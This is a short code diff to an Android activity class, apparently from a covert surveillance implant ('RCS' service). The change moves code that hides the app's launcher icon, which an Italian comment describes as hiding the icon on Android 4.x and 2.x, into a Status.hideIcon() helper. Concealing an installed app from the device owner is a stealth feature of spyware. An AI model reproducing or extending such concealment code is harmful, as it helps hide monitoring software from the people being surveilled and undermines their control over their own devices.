@@ -154,14 +154,10 @@ public class ASG extends Activity {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
 					}
-
-					// Nascondi l'icona (subito in android 4.x, al primo reboot
-					// in android 2.x)
-					PackageManager pm = getApplicationContext().getPackageManager();
-					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-							PackageManager.DONT_KILL_APP);
 				}
+				Status.hideIcon();
 			}
+
 		} catch (final SecurityException se) {
 			if (Cfg.EXCEPTION) {
 				Check.log(se);
